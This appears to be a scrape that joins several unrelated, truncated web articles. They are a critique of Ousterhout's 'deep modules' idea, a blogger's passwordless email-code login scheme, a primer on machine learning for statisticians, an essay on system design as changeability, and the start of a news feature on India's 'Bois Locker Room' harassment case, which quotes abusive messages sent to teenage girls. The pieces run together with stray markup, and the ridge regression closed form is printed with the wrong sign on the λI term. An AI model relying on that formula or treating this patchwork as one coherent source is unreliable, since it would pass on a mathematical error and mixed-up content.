<p>Following other books like <a href="http://shop.oreilly.com/product/0636920022251.do"><i>Code Simplicity</i></a>, PoSD starts with a high-minded explanation of the benefits of good code and the dangers of complexity. Its early chapters are a grand tour of the basic concepts of software organization: separating levels of abstraction, isolating complexity, and when to break up functions. Chapter 5 is one of the most approachable introductions I’ve seen to Parnas’s ideas about information hiding. But it’s Chapter 4 where he introduces the book’s central idea: deep modules. An interface, explains Ousterhout, is not just the function signatures written in the code. It also includes informal elements: high-level behavior, constraints on ordering; anything a developer needs to know to use it. Many modules are shallow: they take a lot to explain, but don’t actually do that much. A good module is deep: the interface should be much simpler than the implementation.</p>

<p>Beautiful, obvious, and impossible to disagree with. Unfortunately, it’s also objectively wrong.</p>

<h2>
When specifications are longer than the code</h2>

<p>It sounds pretty nice to say “interfaces should be shorter than the implementation?” How do you test it?</p>

<p>To Ousterhout, where the interface is just a comment and some discussion about whether it’s simple to use and think about. Intuition and experience are the sole arbiters here. And this reveals his major blind spot.</p>

<p>I’ve <a href="http://www.pathsensitive.com/2018/01/the-three-levels-of-software-why-code.html">explained</a> <a href="http://www.pathsensitive.com/2018/01/the-design-of-software-is-thing-apart.html">before</a>&nbsp;that the important information of software design is not in the code (Level 2), but in the logic: the specifications and reasoning that are rarely written down concretely, but shape the code nonetheless. I group these artifacts into the aggregate “Level 3 constructs.” The “informal interface” Ousterhout describes is such a Level 3 construct, but they’re just as real as the code, and, contrary to Ousterhout, there are plenty of programming languages that do let you write them down and check them.</p>

<p>Experience doing this gives us concrete grounding when we talk software design. It’s how we move into <a href="https://terrytao.wordpress.com/career-advice/theres-more-to-mathematics-than-rigour-and-proofs/">post-rigorous</a> stage of software engineering, and know what we mean when we use terms like “interface” and “complexity.” It defends us against making confused and contradictory statements. Ousterhout lacks this insight, and that’s how he gets burned.</p>

<p>I’m going to pause for a moment and tell you: I like this book overall. It's well-written, and there’s a lot of advice in the book that I consider useful even though it’s on shaky ground, and more that doesn’t depend on this at all. Still, Ousterhout makes a big deal out of it, and so I’ll be taking a couple pages to explain why it’s wrong. These ideas are important, because they’re part of what leads to the higher levels of mastery.</p>

<p>My view is that Ousterhout’s “informal interface” is just the translation into English of a formal specification. Any question we have about interfaces can be answered by asking the question “what would a specification look like?” While I can’t prove the correspondence without peaking into Ousterhout’s head more than I’ve gotten to in our back-and-forth, I’ve found this lens unreasonably effective in helping to explain software design. And so, for the remainder of this post, I’ll be using the words “spec” and “interface” interchangeably.</p>

<p>I agree that the spec should usually be much simpler than the code. But anyone with experience actually formalizing specs can tell you that there are interesting cases where the specification is and should be more complicated than the implementation.</p>

<p>That's right: there are times when it’s actually desirable to have a specification more complicated than the code. Two major reasons are <b>ghost state </b>and <b>imprecision</b>. Ghost state is a concept from verification that describes certain kinds of “subtle” code. It’s an interesting subject that deserves its own blog post; I won’t mention it again. (Short version: it’s when a simple action like flipping a bit actually represents something conceptually complicated.)</p>

<p>Imprecision is a bigger one. For example:</p>

<ul>
<li>Specification: The temperature of the Fudarkameter will be between 60 and 90 degrees.</li>
<li>Implementation: The temperature of the Fudarkameter is 70 degrees.</li>
</ul><p>
The specification is longer precisely because it creates an abstraction barrier. If you design the rest of the system assuming the Fudarkameter is exactly 70 degrees, then the Fudarkameter becomes much harder to change or replace. By weakening the assumptions placed on a module, code becomes more evolvable.</p>

<p>On top of these, there’s another fundamental reason: It is much easier to describe something from the inside than from the outside. It is much easier to show you an apple than to answer every question you may ask of it. (Where are the seeds? How will it roll when I drop it?) And while there is more you can say <a href="http://yudkowsky.net/rational/virtues/">about a single apple</a> than all the apples in the world, there are more things that may be true about some apple than about a single apple.</p>

<p>As an example, let’s take a stack data structure, something I hope we can all agree is a useful abstraction. A stack is a sequence with push and pop operations, following the last-in-first-out ordering. The linked-list implementation is very short: just adding and removing elements off the front of the list. But if you use a stack, and you don’t want to use internal details of this implementation, then you need a way to think about it that doesn’t reference the underlying sequence. One solution is to use the <a href="http://www.cs.unc.edu/~stotts/204/ADTs/">stack axioms</a>, which say things like “If you push something onto a stack and then pop from the stack, you get the old value back” and “If you’ve ever pushed something onto a stack, then it’s not empty.” We’ve gone from the internal view of explaining how the stack operations manipulate memory, to the external view of explaining their interactions and observable behaviors.</p>

<p>In my public correspondence with Prof. Ousterhout, I illustrated this by writing down an implementation and interface for a stack data structure, including the stack axioms. My implementation was 30 tokens; the interface was 54.</p>

<p>Perhaps you can find a shorter way to explain stacks, but this is not looking good. It seems that Ousterhout’s advice, held under a microscope, is actually telling us we should not use stacks in our code (or, at least, only use the more complicated implementations, like lock-free concurrent stacks).</p>

<h3>
<b>A “Simple” API</b></h3>

<p>It’s easy for the interface for stacks to be larger than the implementation because they’re so small. Now, let’s look at something larger. I don’t need to look very hard for an example, because Ousterhout gives me one.</p>

<blockquote>
<p>The mechanism for file IO provided by the Unix operating system and its descendants, such as Linux, is a beautiful example of a deep interface. There are only five basic system calls for I/O, with simple signatures: </p>

<pre><span>int</span> <span>open</span><span>(</span><span>const</span> <span>char</span><span>*</span> <span>path,</span> <span>int</span> <span>flags,</span> <span>mode_t</span> <span>permissions);</span>
<span>ssize_t</span> <span>read</span><span>(</span><span>int</span> <span>fd,</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>
<span>ssize_t</span> <span>write</span><span>(</span><span>int</span> <span>fd,</span> <span>const</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>

<span>int</span> <span>close</span><span>(</span><span>int</span> <span>fd);</span>
</pre>
</div>

<p>The POSIX file API is a great example, but not of a deep interface. Rather, it’s a great example of how code with a very complicated interface may look deceptively simple when reduced to C-style function signatures. It’s a stateful API with interesting orderings and interactions between calls. The flags and permissions parameters of <span>open</span> hide an enormous amount of complexity, with hidden requirements …</p></div></div></div>

        <section>
          <h2>Intro</h2>
<p>In this post, I want to describe the strategy I've used in the last
implementation of one of my side projects. The side project is not important at
all, it's mostly a TODO/GTD task manager, but I use it as a test bed for
anything I'm interested in learning or trying out. The source code is
<a href="https://github.com/msurdi/wipku">here</a> and it is deployed
<a href="https://wipku.herokuapp.com/">here</a> if you want to try this out.</p>
<h2>Disclaimer</h2>
<p>I'm not a security expert, I'm just a web developer and probably not even a good
one, I want to describe this with the intention that somebody that understands more
about this could point out issues and help me make the approach more secure and
more easy to use.</p>
<h2>The problem with passwords</h2>
<p>Personally I don't like passwords, because a) I don't want to use the same
password everywhere, 2) Using different passwords everywhere is impossible
unless you 2a) use a password manager and/or 2b) use a
<a href="http://www.davidgumpper.com/security/developing-a-password-schema/">schema</a>
based on the website or something else that lets you generate the passwords
quickly and consistently for a any given website. And that's just what I don't
like as a user.</p>
<p>As a developer I don't like passwords because its very difficult and risky to
implement all the logic for generating them (salts, algorithms, lengths, etc),
storing them and implementing registration forms, login forms, password reset
forms, etc. So unless you use an existing solution from a CMS or big framework
(<a href="https://www.djangoproject.com/">Django</a>, <a href="https://rubyonrails.org/">Rails</a>,
<a href="https://strapi.io/">Strapi</a>, etc.. ) where you have a "Golden Path" for this,
you're in a pretty bad situation.</p>
<h2>Existing solutions research</h2>
<p>I was looking for a passwordless way to authenticate users without depending on
any third party <a href="https://en.wikipedia.org/wiki/OAuth">oauth</a> provider. While
researching about this, I've found that it seems the most common approach to
this is:</p>
<ol>
<li>Ask the user for email address.</li>
<li>Generate from the server a link with a token and send it by email to the user.</li>
<li>When the user clicks on the link, sign the user in, either in the newly
opened tab/browser or in the original one, or both.</li>
</ol>
<p>This approach is very simple, and I think there are many sites using it. The
first time I came across a login system like this was when I signed up to try
out Zeit's PaaS platform <a href="https://vercel.com/login?with-email=1">here</a>, now
called Vercel, hopefully will still have this name when you read this.</p>
<p>When I was investigating more about this approach, the first question to came to
my mind was wether I should log-in the user in the newly opened tab after the
user has clicked in the email link (thus what do I do in his previous tab?) or
wether again to follow Zeit's approach and in this new tab tell the user
"Awesome, you're now logged in, please close this tab and go back to the other
one". The first approach has an important drawback which is that the link might
have opened on a completely different browser, even on a completely different
device if the user clicked the link on his phone. The second approach I think is
even worse because anyone could go to the website, enter somebody else's email
and if that person happens to accidentally click this email then somebody
somewhere might get logged in as him.</p>
<p>There might be workarounds such as
comparing IP addresses, browser fingerprinting, etc, etc... but it gets risky
and complex in my opinion. Also, the user might not have even clicked in the
link but his antivirus might have made a request to the link, or anything in
between him and his email client. Not great.</p>
<h2>The salted passwordless approach</h2>
<p>So I kept investigating and trying out things and finally came to the following
process I want to describe here with the hope that somebody else will help me
understand more about its drawbacks and why it might not be a good idea, or if
seems to be a good one then help me to improve it.</p>
<p>Also, I'm not sure if this already exists under some well known industry name
and I've just missed that out. Thus I'm basically reinventing the square wheel
here.</p>
<p>So, the process goes like this:</p>
<ol>
<li>The application prompts the user for an email address.</li>
<li>The application saves in the browser's localStorage (or just in memory) the
email address, and randomly generated salt.</li>
<li>The application contacts the backend, submitting the email address and the
generated salt.</li>
<li>The application shows the user a dialog of the kind "We've just sent you an
access code to your email, enter it below".</li>
<li>The server generates an access code and then saves in the database the tuple
consistig of (time, email, salt, code), this is the "authentication request".</li>
<li>The server sends an email to the user, containing just the code, which would
be something like "09124".</li>
<li>The user enters this code in the screen resulting from step 4.</li>
<li>The application submits to the server the tuple (code, email, salt).</li>
<li>If the code, the salt, the email and the expiration (time since request was
created) are valid, then create a session, otherwise fail the login.</li>
</ol>
<p>What problems does this process solve?</p>
<ol>
<li>No need for a password, which was the first requirement.</li>
<li>No need to implement password recovery processes, registration processes, etc.</li>
<li>No need to permanently store any sensitive information about the user. You
might not even need to store the email address (you could use a hash of it as
the user ID).</li>
<li>If the email with the access code is intercepted, there is no risk for the
user: whoever intercepted the email would also need access to the user's
browser localStorage (or memory) to get the salt, otherwise the server won't
validate that access code and thus wont create a session.</li>
<li>We don't have the problem of the user opening the "magic link" in a different
browser, given there is no magic link at all.</li>
</ol>
<p>What drawbacks does this process have?</p>
<ol>
<li>The user will not be able to log in if he is having any kind of problem with
his email, or his email provider is slow to delivery new messages, etc.</li>
</ol>
<h2>Conclusions</h2>
<p>So far I'm pretty excited about this solution and that's probably bad for me,
because I might be missing something out, and that's the main motivation of
writing this down here. Unless there is some big security issue I'm not aware
of, I think the trade-off/drawbacks of the approach are quite acceptable for the
usability and implementation benefits.</p>

<p>I’ve spent the last few months preparing for and applying for data science jobs. It’s possible the data science world may reject me and my lack of both experience and a credential above a bachelors degree, in which case I’ll do something else. Regardless of what lies in store for my future, I think I’ve gotten a good grasp of the mindset underlying machine learning and how it differs from traditional statistics, so I thought I’d write about it for those who have a similar background to me considering a similar move.<sup>1</sup></p>



<p>This post is geared toward people who are excellent at statistics but don’t really “get” machine learning and want to understand the gist of it in about 15 minutes of reading. If you have a traditional academic stats backgrounds (be it econometrics, biostatistics, psychometrics, etc.), there are two good reasons to learn more about data science:</p>



<ul><li>First, data science jobs tend to pay more than other quantitative jobs. It’s a bit taboo to bring this up– after all, aren’t we all supposed to be doing this out of passion and love? I’m not going to pretend that making more money is a bad reason to pursue something, and I reserve no judgment for those whose primary motivation is to earn more.</li><li>Second, data scientists genuinely do some pretty interesting things and have a very interesting approach to working with data, even if my gut reaction is to barf when someone says “teaching the model” instead of “estimating the parameters.”</li></ul>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>Q: What's the difference between statistics and machine learning?</p><p>A: About $50,000/year</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1131244580115046405?ref_src=twsrc%5Etfw">May 22, 2019</a></blockquote></div>
</div></figure>



<p>The world of data science is, in many ways, hiding in plain sight from the more academically-minded quantitative disciplines. I’m not going to spend much time covering the different algorithms that data scientists use: partly because a lot of the algorithms they use are the same as what statisticians use, but also because the algorithms aren’t the point of this post. In this post I’ll be writing a short guide on how to translate your statistics skills into data science very quickly.</p>



<p>After finishing this post, I recommend downloading (for free) and reading through <a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning</a> (herein TESL). It is an excellent and comprehensive textbook that covers all the major machine learning topics, and is geared toward people with a strong math background, especially linear algebra.</p>



<h2>Philosophical Differences Between Statistics and Machine Learning</h2>



<figure></figure>



<p>The main difference between machine learning and statistics is what I’d call “β-hat versus y-hat.” (I’ve also heard it described as inference versus prediction.) Basically, academia cares a lot about what the estimated parameters look like (β-hat), and machine learning cares more about being able to estimate a dependent variable given some inputs (y-hat). There are handful of other differences, but they are rooted in this. Once you understand this, combined with your background in stats, you will basically understand machine learning.</p>



<h4> β-Hat Versus Y-Hat</h4>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>My date: I am studying machine learning</p><p>Me [trying to impress her]: I too am studying how to do regressions in California</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1145076273410129921?ref_src=twsrc%5Etfw">June 29, 2019</a></blockquote></div>
</div></figure>



<p>Once you stop caring about your parameters, you can start making them look like nonsense, i.e. by adding <a href="https://en.wikipedia.org/wiki/Bias_of_an_estimator">bias</a> (the parameter is wrong) or <a href="https://en.wikipedia.org/wiki/Consistent_estimator">inconsistency</a> (the parameter doesn’t converge over infinite observations). In some cases, you can even turn the model into more or less a complete black box that just spits out a y-hat; this is what neural networks are, basically. Traditionally, it’s a cardinal sin in academia to use parameters like these because you can’t say anything interesting about the parameters, but the trick in machine learning is that you don’t need to say anything about the parameters. In machine learning, your focus is on describing y-hat, not β-hat.</p>



<p>Why so much love for y-hat? The friendly, less cynical answer is that within the last decade, everyone got their hands on a crap-ton of data and computational power, and they want to do cool and useful things with it. Machine learning is a pretty natural way to leverage all this data and power because machine learning has tools to deal with multicollinearity and to find really deep, hidden correlations and patterns in data. As you can imagine, machine learning doesn’t let you side-step the dirty work of specifying your data and models (a.k.a. “<a href="https://en.wikipedia.org/wiki/Feature_engineering">feature engineering</a>,” according to data scientists), but it makes it a lot easier to just run things without thinking too hard about how to set it up. In statistics, bad results can be wrong, and being right for bad reasons isn’t acceptable. In machine learning, bad results are wrong if they catastrophically fail to predict the future, and nobody cares much how your crystal ball works, they only care that it works.</p>



<figure><img src="https://thumbor.forbes.com/thumbor/960x0/https%3A%2F%2Fblogs-images.forbes.com%2Fgilpress%2Ffiles%2F2016%2F03%2FTime-1200x511.jpg" alt="Time"><figcaption>For those of you who have never done anything outside a classroom setting, this is literally every data related task, whether you’re an accountant working in Excel or a PhD data scientist working for 6-figures.<br><a href="https://www.forbes.com/sites/gilpress/2016/03/23/data-preparation-most-time-consuming-least-enjoyable-data-science-task-survey-says/#9b3182c6f637">(Source: Forbes.)</a></figcaption></figure>



<p>This newfound love for y-hat is a bit opportunistic, but in fairness, y-hat tends to be more important than β-hat for a wide array of business use cases. For example:</p>



<ul><li>Recommender systems (such as Youtube showing you more videos you might like, or showing  a customer items they might want to buy next).</li><li>Computer vision (such as optical character recognition or facial recognition).</li><li>Forecasting (such as estimating how much a customer will buy at a store, or how likely someone is to default on a loan).</li></ul>



<p>None of these tasks require having a human interpret the parameters and figure out what’s driving what to get a sufficiently acceptable answer; it’s all predictive.</p>



<h4>Letting Go of  β-Hat</h4>



<p>There are a lot of things that data scientists do that made literally zero sense to me before I grasped how to think in terms of y-hat.</p>



<p>The big one that made no sense to me the first time I encountered it back in 2017 is that data scientists split their data into <a href="https://medium.com/datadriveninvestor/data-science-essentials-why-train-validation-test-data-b7f7d472dc1f">“training data,” “validation data,” and “testing data.”</a> The reason this does not make sense to β-hat-brained people is because adding more observations should get you closer to the true parameter because, you know, the law of large numbers. There are two issues with the old school thought process. The first is that there is no “true” parameter if your parameters are intentionally allowed to be a little biased. The second is that there is no guarantee of convergence to anything if your parameters are allowed to be asymptotically inconsistent.</p>



<p>I’m sure you’re asking: “why allow your parameters to be biased?” Good question. The most straightforward answer is that there is a bias-variance trade-off. <a href="https://en.wikipedia.org/wiki/Bias%E2%80%93variance_tradeoff">The Wikipedia article </a>does a good job both illustrating and explaining it. For β-hat purposes, the notion of allowing any bias is crazy. For y-hat purposes, adding a little bias in exchange for a huge reduction in variance can improve the predictive power of your model.</p>



<figure><div>

</div></figure>



<h4>Adding Bias to OLS with Ridge Regression</h4>



<p>Ridge regression is the most straightforward example of adding bias. If you understand OLS, you’re like two paragraphs of reading away from understanding ridge regression.</p>



<p>Basically, instead of just solving for the β vector that minimizes the sum of squared residuals as one does with OLS, i.e. <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ols%7D+%3D+%7B%5Crm+argmin%7D_%7B%5Cboldsymbol%7B%5Cbeta%7D%7D+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+x_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2" title="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2">, you can also add a “penalty” to large squared β’s while trying to find the β-hat that minimizes the objective function. So you add <img src="https://s0.wp.com/latex.php?latex=%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\lambda \sum_{j=1}^K  \beta^2" title="\lambda \sum_{j=1}^K  \beta^2"> to the objective function, where λ is some constant. Then, last but not least, you “standardize” each column <img src="https://s0.wp.com/latex.php?latex=X_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="X_j" title="X_j">, which means transforming it to <img src="https://s0.wp.com/latex.php?latex=Z_j+%5Csim+N%280%2C1%29&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="Z_j \sim N(0,1)" title="Z_j \sim N(0,1)"> by subtracting each column by the column’s mean and dividing by the column’s standard deviation: <img src="https://s0.wp.com/latex.php?latex=z_%7Bi%2Cj%7D+%3D+%28x_%7Bi%2Cj%7D+-+%5Cmu_j%29+%2F+%5Csigma_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j" title="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j"> (the purpose of this is to make it so the parameters measure the <em>relative</em> impacts to the overall result, as opposed to the nominal impacts, otherwise the penalty wouldn’t work the way you’d probably want it to). This gives you the ridge regression estimator:</p>



<p> <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%7B%5Crm+argmin%7D_%5Cbeta+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+z_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2+%2B+%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2"></p>



<p>At λ=0, the summation of squared β’s you just tacked onto the objective function equals zero regardless of what the β-hat vector is, so you just have OLS again. As λ→∞, the penalties for all nonzero β’s become so huge that the only way for the penalties to not overwhelm the objective function is to have all the parameters β-hat = 0. And the closed-form solution to the objective function, it turns out, is pretty similar to OLS’s closed-form solution:   <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%28%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+Z-%5Clambda+%5Cmathbf+I%29%5E%7B-1%7D+%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+y&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y">.</p>



<p>All pretty straightforward, but the real question is why would you do this? Well, if you don’t care about the interpretability/bias of the parameters but you want the model to predict out-of-sample better than regular OLS, you can find some value of  λ through <a href="https://en.wikipedia.org/wiki/Cross-validation_(statistics)">cross-validation</a> that gives you a better fit than  λ=0, i.e. minimizing the <a href="https://en.wikipedia.org/wiki/Mean_squared_prediction_error">prediction errors</a>. But in order to cross-validate the data, you need to split your data into data you use to estimate the parameters (training data) and data to perform the cross-validation on (validation data). This process is what sets your λ.</p>



<p>Ridge regression is OLS with L2 regularization, which is penalization by the square of the parameter. L1 regularization takes the absolute value of the parameters as the penalty instead of the square (i.e. <a href="https://en.wikipedia.org/wiki/Lasso_(statistics)">lasso</a>). And of course, L1 and L2 regularization can be used in contexts other than linear regression, such as logistic regression. These regularization methods are especially good at dealing with multicollinearity, which is definitely something you’d come across with thousands of columns of corporate data and no compelling way to decide which are the best columns to use.<sup>2</sup></p>



<p>I could go on, but regurgitating all of TESL isn’t why I wrote this blog. I like showing ridge regression as an example of machine learning because it’s very similar to OLS, but is totally and unabashedly modified for predictive purposes, instead of inferential purposes. β-hat is never the …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p><em>Note: this essay tries to answer the question “What is the essence of System Design, and how do you do it?”. It covers broad strokes. At some point I hope to go much deeper. Meanwhile, I hope you find this enjoyable :)</em>  </p><hr><p>What is a hacker’s paradise?</p><p>My vote would be the beginning years of a startup. </p><p>The whole system fits in your head. All your problems are important, and you can solve them any way you like. You’re spinning clay while the world is pouring concrete. If you love to create it’s easy to see: despite all the schleps of a startup, an environment with speed, independence, and changeability is paradise.</p><h2>Elephant</h2><p>But we know this doesn’t last long. When those same startups become big, most of them slow down to a crawl. Why is that?</p><p>In one of Rich Hickey’s talks, he made a metaphor that could explain it. Paraphrased, he said “Your system grows into an elephant. Every new feature is you teaching it new tricks”. </p><p>The larger and hairier the elephant, the harder it is to teach it tricks. And, of course some tricks become off-limits: you can’t teach an elephant to do backflips.</p><p>So companies slow down because their systems get large and hairy. Is that the only reason? I don’t think so, but it is certainly one of the biggest. An argument could be made for organizational issues: there’s a cost to lots of people working together. But systems grow exponentially in size, so even if everyone agreed and they worked together perfectly, I’d bet that system complexity would take a fair amount of the blame.</p><h2>System Design</h2><p>Taming that elephant, I think, is the essence of system design. So how do we <em>do s</em>ystem design?</p><p>A lot of complex ideas come to mind when we think about what’s involved: Robustness, performance, stability, safety, scale. These are all important concepts, but I think they are not the central goal. </p><p>The central goal is much simpler. It’s singular and defensive. Remember that when we started, we already <em>had</em> a hacker’s paradise, Our goal is to hold the fort. To do this, just one idea encapsulates it all: changeability. Changeability maximizes the impact an engineer can have on your system, and at the end of the day it’s those engineers who can affect <em>any</em> improvement to your system. This means that robustness, performance, stability, safety, scale, and all else are dependent on changeability. </p><p>System design is then the constant answer to the question: “How can I make my system as changeable as possible?”. That’s a simpler question, but the answer is no less difficult. Note one more surprising bit about it: we must answer this question differently over time. This means that design is dependent on time and context. Your answer can be right if applied at T0, but wrong if applied at T200. </p><h2>Guide</h2><p>Now, if making our system as changeable as possible is our primary act, how do we do it? </p><p>First, we’ll need to start off with the <em>maximum level of changeability.</em> Systems that are maximally changeable are as simple as possible. A simple system is the system that solves a problem with the minimum amount of specific concepts, in a way that keeps all these concepts as decoupled as possible.</p><p>That implies a few things: we would want to choose the most powerful language we can to solve our problem. This lets us use the most powerful abstractions, which will allow us to keep the number of specific concepts that define our program at a minimum. We would want to use powerful, immutable data structures, which will help us keep our abstractions concise and decoupled. It also means that we would want to use the simplest infrastructure we need to solve our problem. Simpler infrastructure allows us to avoid introducing concepts that aren’t needed to solve our problems. The same applies for the abstractions we choose: we’d want to use the abstractions that best solve for our specific use cases, rather than solve generally for potential future usecases we don’t have.</p><p>Note that if you follow these ideas, your initial system may look like a toy. It certainly won’t use kubernetes. Remember that system design is context-dependent, and at this point in time this <em>is</em> the best solution.</p><p>Now, we must iterate. At every step of the way, ask: what’s slowing down our productivity? Pick the highest impact issues and start to address them. Privacy getting too hairy? Introduce an abstraction that centralizes the complexity of privacy, and removes it from the realm of product engineering. Site going down too much? Introduce infrastructure for detection and debugging. Once that’s not enough, consider incident management systems.</p><p>The common theme here: centralize and push complexity down. You take pieces of complexity that <em>every</em> engineer needs to deal with, and create an interface they can use which abstracts the complexity away. As you do that, you try to make that infrastructure accessible: this means it’s written in a place where every engineer can access, in a language that every engineer can change. That will enable all engineers to use your abstraction, while having the option to dive deeper.</p><p>The fact that system design is iterative has two importance consequences. </p><p>The first is that you cannot escape technical debt. Because a solution at T0 becomes more and more incorrect as context changes, you are constantly accruing technical debt. Because of this, <em>there can be no perfect system.</em> It’s your job to constantly manage the tradeoff between quality and debt, and this iterative cycle is your sword.</p><p>The second is that applying blanket solutions will lead to failure. As you get more technical debt, you will invariably end up with a desire to enforce a new paradigm on the system: microservices being the common one today. Because a paradigm solves <em>multiple</em> general *<em>issues, you invariably introduce some concepts that don’t </em>specifically<em> solve your issues, and have their own tradeoffs. The solution is again to lean in to the iterative model: apply </em>specific<em> solutions to </em>specific<em> problems</em>.*</p><h2>Debt</h2><p>As you iterate, you’ll constantly run into the struggle between accruing and paying down debt: do you slow down your velocity <em>now</em> to improve future changeability <em>later</em>? The context we work in is so complicated that there can’t be a simple formula here. But, like in most craft, we can lean in rules of thumb.</p><p>The first problem comes when you are considering <em>introducing</em> new debt. The key rule to consider here is the nature of the debt. Not all debt are created equal — some have higher interest. Let’s compare two examples to illustrate. The first involves introducing a staging environment, or improving performance. This does not get appreciably harder <em>later.</em> Compare that to knowingly introducing a data model change, that you <em>know</em> you’ll need to migrate later. This involves significantly more incidental work: dual writes, backfills, shadow testing, the whole schebang. Based on the nature of the debt and the importance of your current commitments, you need to balance and make a choice.</p><p>The second problem comes when you are considering <em>paying down</em> debt. The key rule to consider here is pain. You already have a sense of the debt that is either causing the biggest slow down, or is about too. It’s difficult to measure your success here, as if you do your job well, no one will even feel the pain. Nevertheless this skill can be learned from your mistakes. First fix what causes the most pain immediately. Then, get better and better at pre-empting the largest amount of pain earlier. That, granted is a lofty goal — I have never worked at a company where there wasn’t at least one glaring way to make things a magnitude better.</p><h2>Fin</h2><p>So we come down to the central idea. To keep your hacker’s paradise you need to tame your system complexity elephant. To do that, you need to keep your system as changeable as possible. To do that, you need to start out with a simple system, and evolve it iteratively as you grow. There’s so much more I want to go deeper into, but that will have to wait for another. I hope this gives you a good model to think with.</p><p><em>Thanks to Mark Shlick, Jacky Wang, Daniel Woelfel, Irakli Popkhadze, David Magaltadze, Irakli Safareli, for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>

<p><span>T</span>his spring, a group of schoolboys in Delhi played an obscene guessing game. In a group chat on Instagram, one boy shared a photo of<strong> </strong>a girl with the group, challenging the others to guess her age. The prize for a correct guess: her social media handle. “Bad dressing sense,” one boy <a href="https://video-images.vice.com/test-uploads/_uncategorized/1588744369584-bois-locker-room.jpeg?resize=1575:*">commented</a>. “ikr [I know right],” replied the original poster, “But good tits.”&nbsp;</p>



<p>One of the alleged victims of the group, which became known as the Bois Locker Room chat, was Madhuri, a 17-year-old girl in Bangalore who asked to be identified by a pseudonym. She told <em>Rest of World</em> that, in April, she received an unsolicited message from one of the boys requesting nude photographs. “I refused, but he kept on insisting,” she said. She showed <em>Rest of World</em> a screenshot of his response: “You motherfucker. Send me pictures of your breasts. How dare you say no to me?” The boy then superimposed Madhuri’s face onto a pornographic picture and sent it to her. She blocked him. But a month later, she realized he also shared the picture on the Bois Locker Room chat. She soon learned she<strong> </strong>was not the only one. The group had targeted multiple underage girls with photo manipulation. “It was disgusting,” she said. “One boy replied that he preferred bigger breasts. Another said he’d like to rape me.” What Madhuri didn’t do is go to the police. “They don’t take [sexual-harassment cases] very seriously,” Madhuri told me. “Besides, my parents would have felt bad about me going public. You know what it’s like for girls. We’d be blamed first.”&nbsp;</p>



<p>Yet Madhuri and the other victims would soon attain some measure of justice via unconventional means. She sent the screenshots to <a href="https://www.instagram.com/shubhamcybercop/">@shubhamsinghcybercop</a>, an Instagram user who had quietly begun investigating the case.<strong> </strong>After recording her statement, he asked if she wished to submit a legal complaint; she declined. </p>



<p>The operator of the account is Shubham Singh, a 25-year-old wunderkind digital detective of sorts in Mumbai, some 1,400 kilometers away. He regards himself as a private investigator, gathering information to verify claims of online harassment and encouraging victims to pursue legal action. His vigilantism — what he calls “ethical hacking” — resides somewhere on the spectrum between the formal justice of the courts and the informal justice of the social-media tribunal. Despite his unorthodox methods, he has quickly become one of India’s most popular cybercrime&nbsp;experts, assisting Mumbai’s police in cases ranging from petty fraud to kidnapping, and even occasionally lending a hand to anti-terrorism efforts.</p>



